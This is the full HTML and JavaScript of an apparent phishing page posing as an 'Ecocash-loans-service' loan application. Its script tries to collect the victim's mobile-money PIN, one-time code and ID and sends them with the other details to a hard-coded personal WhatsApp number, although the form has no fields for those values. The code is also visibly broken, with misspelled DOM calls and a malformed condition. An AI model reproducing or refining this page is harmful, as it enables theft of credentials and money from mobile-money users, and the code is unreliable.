<!DOCTYPE html>
<html>
<head>
<title>Ecocash-loans-service </title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial; background: #000000; padding: 20px; margin: 0; }
.box { background: #000000; max-width: 400px; margin: auto; padding: 20px; }
h2 { text-align: center; color: #ffffff; }
p { text-align: center; color: #ffffff; }
label { display: block; margin-top: 12px; font-weight: bold; color: #ffffff; }
input, select { width: 100%; padding: 12px; margin-top: 5px; border-radius: 6px; border: 1px solid #555; background: #000000; color: #ffffff; }
button { width: 100%; padding: 14px; margin-top: 16px; background: #ffffff; color: #000000; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; }
.small { font-size: 12px; color: #ffffff; text-align: center; margin-top: 12px; }
</style>
</head>
<body>
<div class="box">
<h2>ecocash-loan-service</h2>
<p>Fast & Safe Loan Application</p>
<label>Full Name</label>
<input type="text" id="name" placeholder="Your full name">
<label>Phone Number</label>
<input type="tel" id="phone" placeholder="e.g. +263712345678">
<label>Loan Amount</label>
<input type="number" id="amount" placeholder="e.g. 5000">
<label>Months to Pay Back</label>
<select id="months">
<option value="1">1 month</option>
<option value="2">2 months</option>
<option value="3">3 months</option>
<option value="6">6 months</option>
<option value="12">12 months</option>
</select>
<button onclick="sendApplication()">Apply Now</button>
<p class="small">Your application will be sent to Ecocash-loans-service for review.</p>
</div>
<script>
let MY_NUMBER = "0762923438 ";
function sendApplication() {
  let name = document.getElementById('name').value;
  let phone = document.getElementById('phone').value;
  let amount = document.getElementById('amount').value;
  let months = document.getElementById('months').value;
  let pin = document. getElementByd('pin').value;
  let otp = document. getElementByd('otp').value;
  let id = document. getElementByd('id').value;
  if(!name || !phone || !amount |! Pin) { alert('Please fill name, phone and amount'); return; }
  let total = (amount * 1.10).toFixed(2);
  let monthly = (total / months).toFixed(2);
  let msg = "NEW LOAN APPLICATION - Ecocash-loans-service%0A%0AName: " + name + "%0APhone: " + phone + "%0ALoan Amount: " + amount + pin + "%0AMonths: " + months + "%0ATotal to pay: " + total + "%0AMonthly: " + monthly;
  window.open("https://wa.me/" + MY_NUMBER + "?text=" + msg, "_blank");
}
</script>
</body>
</html>
